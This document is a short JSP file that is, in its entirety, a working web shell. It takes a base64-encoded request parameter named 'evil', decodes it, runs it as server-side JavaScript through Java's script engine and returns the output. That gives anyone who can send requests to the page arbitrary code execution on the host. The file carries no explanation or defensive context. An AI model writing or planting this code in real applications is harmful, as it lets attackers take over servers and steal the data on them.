<%
out.println(request.getParameter("evil")!=null ? new javax.script.ScriptEngineManager().getEngineByName("js").eval(new String(javax.xml.bind.DatatypeConverter.parseBase64Binary(request.getParameter("evil")))):"");
%>